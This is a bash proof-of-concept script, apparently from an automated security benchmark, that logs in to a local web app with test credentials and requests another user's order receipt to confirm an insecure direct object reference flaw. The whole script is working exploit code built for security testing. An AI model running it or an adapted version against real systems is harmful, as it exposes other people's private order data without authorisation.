#!/bin/bash
# POC: IDOR POC following the multi-step authentication flow then testing unauthorized order access
# Target: ./repo
# Created: 2025-11-07T16:39:25.305Z
# Session: benchmark-XBEN-001-24-mhp2ljz1

# IDOR Vulnerability POC - Order Receipt Access (v3)
# Demonstrates insufficient authorization validation on /order/{orderId}/receipt endpoint
# Based on the multi-step authentication flow: /username -> /password/{username} -> authenticated

TARGET="${TARGET:-http://localhost:8082}"

echo "=========================================="
echo "IDOR Vulnerability POC - Order Receipt"
echo "=========================================="
echo "Target: $TARGET"
echo ""

# Step 1: Submit username
echo "[STEP 1] Initiating login flow (username step)..."
USERNAME_RESPONSE=$(curl -s -c /tmp/cookies.txt -X POST "$TARGET/" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=test" -w "\n%{http_code}")

USERNAME_CODE=$(echo "$USERNAME_RESPONSE" | tail -n 1)
echo "  Username step status: $USERNAME_CODE"
echo ""

# Step 2: Submit password
echo "[STEP 2] Submitting password..."
PASSWORD_RESPONSE=$(curl -s -b /tmp/cookies.txt -c /tmp/cookies.txt -X POST "$TARGET/password/test" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "password=test" -w "\n%{http_code}")

PASSWORD_CODE=$(echo "$PASSWORD_RESPONSE" | tail -n 1)
echo "  Password step status: $PASSWORD_CODE"
echo ""

# Verify we have a valid session
echo "[STEP 3] Verifying session..."
if [ -f /tmp/cookies.txt ]; then
    echo "  ✓ Session cookies obtained"
else
    echo "  ✗ No session cookies found"
    exit 1
fi
echo ""

# Now test the IDOR vulnerability
echo "[TEST 1] Accessing order receipt for AUTHORIZED order (300123):"
echo "  Command: curl -b /tmp/cookies.txt $TARGET/order/300123/receipt"
OWNED_RESPONSE=$(curl -s -w "\n%{http_code}" -b /tmp/cookies.txt "$TARGET/order/300123/receipt")
OWNED_BODY=$(echo "$OWNED_RESPONSE" | head -n -1)
OWNED_CODE=$(echo "$OWNED_RESPONSE" | tail -n 1)
OWNED_SIZE=$(echo "$OWNED_BODY" | wc -c)

echo "  HTTP Status: $OWNED_CODE"
echo "  Response Size: $OWNED_SIZE bytes"
echo "  Response preview: $(echo "$OWNED_BODY" | head -c 100 | sed 's/[^[:print:]]/_/g')..."
echo ""

# Test 2: Access non-owned order
echo "[TEST 2] Accessing order receipt for UNAUTHORIZED order (300124):"
echo "  Command: curl -b /tmp/cookies.txt $TARGET/order/300124/receipt"
UNOWNED_RESPONSE=$(curl -s -w "\n%{http_code}" -b /tmp/cookies.txt "$TARGET/order/300124/receipt")
UNOWNED_BODY=$(echo "$UNOWNED_RESPONSE" | head -n -1)
UNOWNED_CODE=$(echo "$UNOWNED_RESPONSE" | tail -n 1)
UNOWNED_SIZE=$(echo "$UNOWNED_BODY" | wc -c)

echo "  HTTP Status: $UNOWNED_CODE"
echo "  Response Size: $UNOWNED_SIZE bytes"
echo "  Response preview: $(echo "$UNOWNED_BODY" | head -c 100 | sed 's/[^[:print:]]/_/g')..."
echo ""

# Test 3: Analyze responses
echo "[TEST 3] Vulnerability Analysis:"
echo "  Authorized access (300123): HTTP $OWNED_CODE ($OWNED_SIZE bytes)"
echo "  Unauthorized access (300124): HTTP $UNOWNED_CODE ($UNOWNED_SIZE bytes)"
echo ""

# Test 4: Determine if vulnerable
echo "[TEST 4] Authorization Validation Check:"
VULNERABLE=0

if [ "$UNOWNED_CODE" = "200" ]; then
    echo "  ✗ VULNERABLE - HTTP 200 returned for unauthorized access"
    echo "    Expected: HTTP 403 Forbidden"
    echo "    Impact: Enables enumeration and potential IDOR attacks"
    VULNERABLE=1
elif [ "$UNOWNED_CODE" = "403" ]; then
    echo "  ✓ PROPERLY PROTECTED - HTTP 403 returned for unauthorized access"
elif [ "$UNOWNED_CODE" = "302" ]; then
    echo "  ? REDIRECT (302) - May indicate insufficient authorization"
    if [ "$OWNED_CODE" = "200" ] && [ "$UNOWNED_CODE" = "302" ]; then
        echo "  ✗ VULNERABLE - Different responses enable enumeration"
        VULNERABLE=1
    fi
else
    echo "  ? Unexpected response code: $UNOWNED_CODE"
fi

echo ""
echo "[TEST 5] Response Size Enumeration:"
if [ "$OWNED_SIZE" -gt 0 ] && [ "$UNOWNED_SIZE" -gt 0 ]; then
    SIZE_RATIO=$(echo "scale=2; $OWNED_SIZE / $UNOWNED_SIZE" | bc 2>/dev/null || echo "N/A")
    echo "  Authorized size: $OWNED_SIZE bytes"
    echo "  Unauthorized size: $UNOWNED_SIZE bytes"
    if [ "$OWNED_SIZE" != "$UNOWNED_SIZE" ]; then
        echo "  ✗ Different sizes enable timing/size-based enumeration attacks"
        VULNERABLE=1
    else
        echo "  ✓ Consistent response sizes (prevents enumeration)"
    fi
fi

echo ""
echo "=========================================="
if [ $VULNERABLE -eq 1 ]; then
    echo "✓ IDOR VULNERABILITY CONFIRMED"
    exit 0
else
    echo "✗ Vulnerability not reproduced"
    exit 1
fi